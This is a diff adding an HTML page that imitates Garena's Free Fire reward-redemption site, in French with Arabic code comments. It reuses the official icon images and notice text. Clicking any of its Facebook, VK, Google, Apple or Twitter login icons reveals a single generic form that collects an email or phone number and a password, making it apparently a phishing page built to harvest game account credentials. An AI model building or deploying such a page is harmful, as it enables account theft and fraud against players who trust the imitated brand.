@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Noto Sans TC', sans-serif; }
+        body { display: flex; height: 100vh; overflow: hidden; background: #000; }
+        
+        /* القسم الأيسر: خلفية بنفسجية متدرجة احترافية */
+        .left-side {
+            width: 45%; 
+            /* تدرج لوني يحاكي شاشة الدخول في اللعبة */
+            background: radial-gradient(circle at 30% 50%, #4a00e0, #8e2de2, #1a0033);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        
+        /* إضافة اسم اللعبة كبديل للصورة المكسورة */
+        .left-side::after {
+            content: "FREE FIRE";
+            color: rgba(255, 255, 255, 0.1);
+            font-size: 8vw;
+            font-weight: 900;
+            position: absolute;
+            letter-spacing: 5px;
+            transform: rotate(-15deg);
+        }
+
+        /* القسم الأيمن */
+        .right-side {
+            width: 55%;
+            background-color: #f5d13b; 
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding: 50px 60px;
+            position: relative;
+            overflow-y: auto;
+        }
+
+        /* الشعار (استخدمت خط بدلاً من الصورة لضمان عدم كسره) */
+        .logo-top { 
+            position: absolute; 
+            top: 30px; 
+            left: 40px; 
+            font-size: 28px;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            z-index: 10;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 70px;
+            margin-bottom: 10px;
+        }
+        h1 { font-size: 32px; color: #111; font-weight: 900; letter-spacing: -0.5px; }
+
+        /* زر المتجر */
+        .shop-btn {
+            background: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            text-decoration: none;
+        }
+        .shop-btn svg { width: 20px; height: 18px; }
+
+        p.subtitle { font-size: 18px; margin-bottom: 40px; color: #333; font-weight: 700; }
+
+        /* الأيقونات */
+        .social-icons { display: flex; gap: 15px; margin-bottom: 50px; }
+        .social-icons img {
+            width: 60px; height: 60px; border-radius: 50%; background: #fff;
+            cursor: pointer; transition: 0.3s; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            padding: 12px; 
+        }
+        .social-icons img:hover { transform: translateY(-3px); }
+
+        /* النموذج */
+        .login-form { display: none; flex-direction: column; margin-bottom: 30px; width: 100%; max-width: 450px; }
+        .login-form input { padding: 15px; margin-bottom: 15px; border: 2px solid #111; border-radius: 6px; font-size: 16px; width: 100%; font-weight: 700; }
+        .login-form button { padding: 15px; background: #111; color: #fff; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: 700; }
+
+        /* النص السفلي */
+        .notice { margin-top: auto; font-size: 14px; line-height: 1.8; color: #111; font-weight: 700; }
+        .notice span.red { color: #d32f2f; }
+    </style>
+</head>
+<body>
+
+    <!-- القسم الأيسر -->
+    <div class="left-side">
+        <!-- تم إزالة الصورة المكسورة، الخلفية الآن هي التصميم -->
+    </div>
+
+    <!-- القسم الأيمن -->
+    <div class="right-side">
+        <!-- استخدام نص بدلاً من صورة الشعار المكسورة -->
+        <div class="logo-top">Garena</div>
+        
+        <div class="header-container">
+            <h1>Site d'échange de récompenses</h1>
+            <a href="#" class="shop-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 18" fill="none">
+                    <path d="M0.98999 1.06891L2.95039 1.68886L6.51474 15.3278" stroke="black" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
+                    <path d="M4.35645 4.87579H19.0099" stroke="black" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
+                    <path d="M6.21777 12.1425H15.5627L17.3861 5.42993" stroke="black" stroke-width="1.6" stroke-linejoin="round"></path>
+                    <path d="M6.09908 18C6.8865 18 7.52482 17.3109 7.52482 16.4608C7.52482 15.6107 6.8865 14.9216 6.09908 14.9216C5.31167 14.9216 4.67334 15.6107 4.67334 16.4608C4.67334 17.3109 5.31167 18 6.09908 18Z" fill="black"></path>
+                    <path d="M15.3266 18C16.114 18 16.7524 17.3109 16.7524 16.4608C16.7524 15.6107 16.114 14.9216 15.3266 14.9216C14.5392 14.9216 13.9009 15.6107 13.9009 16.4608C13.9009 17.3109 14.5392 18 15.3266 18Z" fill="black"></path>
+                </svg>
+                Boutique
+            </a>
+        </div>
+        
+        <p class="subtitle">Veuillez vous connecter.</p>
+
+        <!-- الأيقونات -->
+        <div class="social-icons" id="icons-container">
+            <img src="https://cdn.wildflamestudio.com/common/web_event/tweb-event/redemption/img/facebook.png" onclick="showForm()" alt="Facebook">
+            <img src="https://cdn.wildflamestudio.com/common/web_event/tweb-event/redemption/img/vk.png" onclick="showForm()" alt="VK">
+            <img src="https://cdn.wildflamestudio.com/common/web_event/tweb-event/redemption/img/google.png" onclick="showForm()" alt="Google">
+            <img src="https://cdn.wildflamestudio.com/common/web_event/tweb-event/redemption/img/apple.png" onclick="showForm()" alt="Apple">
+            <img src="https://cdn.wildflamestudio.com/common/web_event/tweb-event/redemption/img/twitter.png" onclick="showForm()" alt="Twitter">
+        </div>
+
+        <form class="login-form" id="myForm" method="POST">
+            <input type="text" name="email" placeholder="Email or Phone Number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Se connecter</button>
+        </form>
+
+        <div class="notice">
+            <strong>Avis important :</strong><br>
+            1. Le code d'échange comporte <span class="red">12 ou 16</span> caractères, composés de lettres majuscules et de chiffres.<br>
+            2. Les récompenses obtenues sont affichées dans l'onglet <span class="red">[Coffre]</span> du lobby du jeu ; les pièces d'or ou les diamants sont automatiquement ajoutés au portefeuille de votre compte.<br>
+            3. Veuillez vérifier la date d'expiration du code. Les codes expirés ne peuvent pas être utilisés.<br>
+            4. Veuillez contacter le service client si vous rencontrez un problème.
+        </div>
+    </div>
+
+    <script>
+        function showForm() {
+            document.getElementById('icons-container').style.display = 'none';
+            document.getElementById('myForm').style.display = 'flex';
+        }
+    </script>
+</body>
+</html>
